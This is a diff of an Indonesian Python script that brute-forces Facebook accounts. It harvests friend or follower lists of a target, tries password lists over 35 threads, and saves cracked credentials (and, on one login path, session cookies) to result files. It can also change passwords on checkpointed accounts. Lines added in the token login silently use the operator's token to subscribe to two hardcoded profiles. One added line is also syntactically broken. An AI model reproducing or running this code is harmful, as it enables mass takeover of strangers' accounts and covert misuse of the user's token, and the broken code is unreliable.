@@ -1,33 +1,25 @@
 #!/usr/bin/python3
 #coding=utf-8
 
+
 """
 
 Copyright © 2021 - 2023 | Latip176
 Semua codingan dibuat oleh Latip176.
 
 """
-
 import json, os, re, time
 from concurrent.futures import ThreadPoolExecutor as Bool
-
-P = "\x1b[0;97m" 
-M = "\x1b[0;91m"
-H = "\x1b[0;92m"
-K = "\x1b[0;93m"
-B = "\x1b[0;94m"
-
-BM = "\x1b[0;96m"
 
 try:
 	import requests as req
 except:
-	print("[{M}!{P}] {BM}Ops! Module requests belum terinstall...\nSedang Menginstall Module...{P}")
+	print("[!] Ops! Module requests belum terinstall...\nSedang Menginstall Module...")
 	os.system("python3 -m pip install requests")
 try:
 	from bs4 import BeautifulSoup as par
 except:
-	print("[{M}!{P}] {BM}Ops! Module bs4 belum terinstall...\nSedang Menginstall Module...{P}")
+	print("[!] Ops! Module bs4 belum terinstall...\nSedang Menginstall Module...")
 	os.system("python3 -m pip install bs4")
 
 os.system("clear")
@@ -48,7 +40,7 @@ class Main(object):
 		self.id = id
 		self.name = name
 	def banner(self):
-		banner = f"""
+		banner = """
 _________  ________  __      __________  
 \_   ___ \ \_____  \/  \    /  \_____  \ 
 /    \  \/  /   |   \   \/\/   / _(__  < 
@@ -56,8 +48,9 @@ _________  ________  __      __________
 \
  \______  /\_______  /\__/\  / /______  /
         \/         \/      \/         \/ 
-	Version: {BM}0.1.5{P}
-  Coded by: Latip176, Sponsore: Fatah Sewu
+	Version: 0.1.3
+	Coded by: Latip176
+	Sponsore: Fatah Sewu
 		"""
 		return banner
 	def cpdetect(self):
@@ -77,20 +70,20 @@ _________  ________  __      __________
 		cpp.Eksekusi("https://mbasic.facebook.com",_file,"file","".join(pwBaru),"".join(ub))
 	def proses(self):
 		print("")
-		op = input(f"[{K}?{P}] Munculkan opsi cp [y/t]: ")
+		op = input("[?] Munculkan opsi [y/t]: ")
 		if op in ("y","Y"):
 			opsi.append("y")
-			ww=input(f"[{K}?{P}] Ubah pw ketika tap yes [y/t]: ")
+			ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
 			if ww in ("y","ya"):
-				pwBar=input(f"[{H}+{P}] Masukan pw baru: ")
+				pwBar=input("[+] Masukan pw baru: ")
 				ub.append("y")
 				if len(pwBar) <= 5:
-					exit(f"{M}Password harus lebih dari 6 character!{P}")
+					exit("Password harus lebih dari 6 character!")
 				else:
 					pwBaru.append(pwBar)
 			else:
 				print("> Skipped")
-		print(f"\n[{BM}!{P}] Akun hasik ok di save di ok.txt\n[{BM}!{P}] Akun hasil cp di save di cp.txt\n")
+		print("\n[!] Akun hasik ok di save di ok.txt\n[!] Akun hasil cp di save di cp.txt\n")
 
 class Data(Main):
 	
@@ -98,63 +91,41 @@ class Data(Main):
 		os.system("clear")
 		print(self.banner())
 		print(f" * Welcome {self.name} in tool! Pilih crack dan mulai.")
-		print(f"[{BM}1{P}]. Crack dari pertemanan publik\n[{BM}2{P}]. Crack dari followers publik\n[{BM}3{P}]. Checkpoint detector\n[{M}0{P}]. Logout akun (hapus token)\n")
-		_chose = input(f"[{K}?{P}] Chose: ")
+		print("[1]. Crack dari pertemanan publik\n[2]. Crack dari followers publik\n[3]. Checkpoint detector\n[0]. Logout akun (hapus token)\n")
+		_chose = input("[?] Chose: ")
 		__pilih = ["01","1","02","2","03","3","0"]
 		while _chose not in __pilih:
 			print("\n[!] Pilihan tidak ada")
 			_chose = input("[?] Chose: ")
 		print("")
 		if _chose in ("01","1"):
-			print(f"[{BM}!{P}] Ketik {BM}'me'{P} untuk teman list kamu")
-			__id = input(f"[{K}?{P}] Masukan username atau id target: ").replace("'me'","me")
-			if(re.findall("\w+",__id)):
-				if(__id not in ("me","'me'")):
-					r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text
-					try:
-						id = re.findall('\;rid\=(\d+)\&',str(r))[0]
-					except:
-						exit(f"{M}[!] Ops! Username tidak ditemukan.{P}")
-					self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(id)
-				else:
-					self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id)
-			else:
-				self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id)
+			print("[!] Ketik 'me' untuk teman list kamu")
+			__id = input("[?] Masukan id target: ").replace("'me'","me")
+			self.data = dump.Dump("https://graph.facebook.com",self.token).pertemanan(__id)
 			self.submit(self.data)
 		elif _chose in ("02","2"):
-			print(f"[{BM}!{P}] Ketik {BM}'me'{P} untuk followers list kamu")
-			__id = input(f"[{K}?{P}] Masukan username atau id target: ").replace("'me'","me")
-			if(re.findall("\w+",__id)):
-				if(__id not in ("me","'me'")):
-					r=req.get(f"https://m.facebook.com/{__id}",						headers={"user-agent":"chrome"}).text
-					try:
-						id = re.findall('\;rid\=(\d+)\&',str(r))[0]
-					except:
-						exit(f"{M}[!] Ops! Username tidak ditemukan.{P}")
-					self.data = dump.Dump("https://graph.facebook.com",self.token).followers(id)
-				else:
-					self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id)
-			else:
-				self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id)
+			print("[!] Ketik 'me' untuk followers list kamu")
+			__id = input("[?] Masukan id target: ").replace("'me'","me")
+			self.data = dump.Dump("https://graph.facebook.com",self.token).followers(__id)
 			self.submit(self.data)
 		elif _chose in ("03","3"):
 			self.cpdetect()
 		elif _chose in ("0","00"):
 			os.system("rm -rf data/save.txt")
-			exit(f"{H}Thanks You....{P}\n")
+			exit("Thanks You....\n")
 		else:
-			print(f"{M}[×] Kesalahan...{P}")
+			print("[×] Kesalahan...")
 	
 	def submit(self,data):
-		print(f"\n[!] Pilih Metode Crack\n[{BM}1{P}] Metode b-api\n[{BM}2{P}] Metode mbasic")
-		metode = input(f"[{K}?{P}] Chose: ")
-		print(f"\n[!] D: {B}Default, {P}M: {BM}Manual, {P}G: {H}Gabung. {P}")
-		pasw=input(f"[{K}?{P}] Password [d/m/g]: ")
+		print("\n[!] Pilih Metode Crack\n[1] Metode b-api\n[2] Metode mbasic")
+		metode = input("[?] Chose: ")
+		print("\n[!] D: Default, M: Manual, G: Gabung. ")
+		pasw=input("[?] Password [d/m/g]: ")
 		if pasw in ("m","M","g","G"):
-			print(f"[{BM}!{P}] Pisahkan password menggunakan koma contoh (sayang,bangsad)")
-			tam = input(f"[{H}+{P}] Masukan password: ").split(",")
+			print("[!] Pisahkan password menggunakan koma contoh (sayang,bangsad)")
+			tam = input("[+] Masukan password: ").split(",")
 		self.proses()
-		print(" * Crack dimulai... CTRL + Z untuk stop! \n * Nyalakan mode pesawat jika tidak mendapatkan hasil\n")
+		print(" * Crack dimulai... CTRL + Z untuk stop! \n")
 		with Bool(max_workers=35) as kirim:
 			for __data in data:
 				nama,id = __data.split("<=>")
@@ -207,7 +178,7 @@ class Crack(Main):
 				continue
 			if 'access_token' in response.text and 'EAAA' in response.text:
 				ok+=1
-				print(f"\r\r\33[32;1m[OK] {user} | {pw} | {response.json()['access_token']}\n\33[37;1m",end="")
+				print(f"\r[OK] Akun aman			\n[=] {user} | {pw}					\n\n",end="")
 				open("results/ok.txt","a").write(user+"|"+pw+"\n")
 				break
 			elif 'www.facebook.com' in response.json()['error_msg']:
@@ -216,7 +187,7 @@ class Crack(Main):
 				if "y" in opsi:
 					cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
 				else:
-					print(f"\r\33[1;33m[CP] {user} | {pw}          ∆\33[37;1m\n",end="")
+					print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
 				open("results/cp.txt","a").write(user+"|"+pw+"\n")
 				break
 			else:
@@ -261,31 +232,25 @@ class Crack(Main):
 				exit("Ganti useragent!")
 			if "c_user" in session.cookies.get_dict():
 				if "Akun Anda Dikunci" in response.text:
-					print(f"\r\33[31;1m[CP] {user} | {pw} -> SESI NEW\n\33[37;1m",end="")
+					print(f"\r\33[31;1m[CP] {user} | {pw} -> SESI NEW								\n\33[37;1m",end="")
 				else:
 					ok+=1
 					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-					print(f"\r\33[32;1m[OK] {user}|{pw}|{coki}\n\33[37;1m",end="")
-					print(f"[{H}+{P}] Apk yang terkait:")
-					cpp.Eksekusi("","","","","").cek_apk(session,coki)
+					print(f"\r\33[32;1m[OK] {user} | {pw} | {coki}					\n\n",end="")
 					open("results/ok.txt","a").write(user+"|"+pw+"\n")
 					break
 			elif "checkpoint" in session.cookies.get_dict():
-				title = re.findall("\<title>(.*?)<\/title>",str(response.text))
-				if "Masukkan Kode Masuk untuk Melanjutkan" in title:
-					print(f"\r\33[31;1m[CP] {user} | {pw} -> A2F ON\n\33[37;1m",end="")
+				if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
+					print(f"\r\33[31;1m[CP] {user} | {pw} -> A2F ON								\n\33[37;1m",end="")
 				else:
 					cp+=1
 					_file = user+"|"+pw
 					if "y" in opsi:
 						cpp.Eksekusi("https://mbasic.facebook.com",_file,"satu","".join(pwBaru),"".join(ub))
 					else:
-						if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
-							print(f"\r\33[32;1m[OK] {user} | {pw} -> Tap Yes\n\33[37;1m",end="")
-						else:
-							print(f"\r\33[1;33m[CP] {user} | {pw}          ∆\33[37;1m\n",end="")
+						print(f"\r\33[1;33m[CP] {user} | {pw}								\n\33[37;1m",end="")
 					open("results/cp.txt","a").write(user+"|"+pw+"\n")
-				break
+					break
 			else:
 				if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
 					print("\r\33[31;1m[!] hidupkan mode pesawat selama 2 detik \33[37;1m\n",end="")
@@ -305,22 +270,40 @@ def login():
 ........................................
 	"""
 	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
-	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies [Rawan Sesi New]\n[2]. Login menggunakan token")
+	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies\n[2]. Login menggunakan token")
 	bingung = input("\n[?] Login menggunakan: ")
 	__pilihan = ["01","1","02","2"]
 	while bingung not in __pilihan:
 		print("\n[!] Pilihan tidak ada")
 		bingung = input("[?] Login menggunakan: ")
 	if bingung in ("01","1"):
-		cokiee = input("[?] cookie\t: ")
-		coki = cv.main(cookie).__init__(self,cookie,token,cookie_mentah)
+		__cokiee = input("[?] cookie\t: ")
+		__coki = cv.Main(__cokiee).__init__(self,cookie,token,cookie_mentah):
+		if "EAA" in __coki:
+			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
+			_id = _cek['id']
+			_nama = _cek['name']
+			input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
+			open("data/save.txt","a").write(__coki)
+			Data(__coki,_id,_nama).menu()
+		elif "Cookies Invalid" in __coki:
+			exit("\n[!] Cookies Invalid")
+		else:
+			exit("\n[!] Kesalahan")
+	elif bingung in ("02","2"):
+		__token = input("[?] token\t: ")
 		try:
-		  get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
-		  jsx = json.loads(get.text)
-		  nama = jsx["name"]
-		  input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
-		  open("data/save.txt","a").write(cookie);Data(cookie,nama).menu()
-		  except:print('\n[•] Error!!');exit()
+			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
+			_nama = __res['name']
+			_id = __res['id']
+			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
+			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
+			input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
+			open("data/save.txt","a").write(__token)
+			Data(__token, _id, _nama).menu()
+		except KeyError:
+			print("\n[!] token invalid")
+	
 	
 if __name__=="__main__":
 	try:
